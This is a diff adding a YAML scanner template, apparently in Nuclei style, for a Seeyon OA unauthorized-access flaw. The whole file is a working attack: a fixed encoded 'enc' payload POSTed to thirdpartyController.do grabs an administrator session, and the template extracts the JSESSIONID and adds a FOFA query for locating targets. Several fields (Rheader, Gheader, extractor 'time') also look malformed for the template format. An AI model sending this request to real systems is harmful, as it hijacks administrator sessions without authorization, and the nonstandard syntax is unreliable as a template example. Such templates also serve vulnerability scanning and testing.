@@ -1,0 +1,55 @@
+id: seeyou未授权访问
+time: '2021-04-08'
+
+
+info:
+  name: Seeyon Unauthoried Access
+  author: pikpikcu
+  severity: high
+  description: 致远OA, thirdpartyController.do默认的管理ID导致seession泄露
+  reference:
+    - https://mp.weixin.qq.com/s/0AqdfTrZUVrwTMbKEKresg
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: app="致远互联-OA"
+  tags: misconfig,seeyon,unauth
+  
+http:
+  - method: 
+      - POST
+      - GET
+    path:
+      - "{{BaseURL}}/seeyon/thirdpartyController.do"
+      - "{{BaseURL}}/seeyon/main.do"
+    body:
+      - "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4"
+    Rheader:
+      - Content-Type:application/x-www-form-urlencoded & Accept-Encoding:deflate
+    Gheader:
+      - Cookie:session & Content-Type:application/x-www-form-urlencoded & Accept-Encoding:deflate
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "当前已登录了一个用户，同一窗口中不能登录多个用户"
+          - "<a href='/seeyon/main.do?method=logout'"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+    
+    extractors:
+      - name: 
+          - session
+        part: 
+          - Gheader
+        time: 
+          - 1
+        regex:
+          - 'JSESSIONID=(.*)'
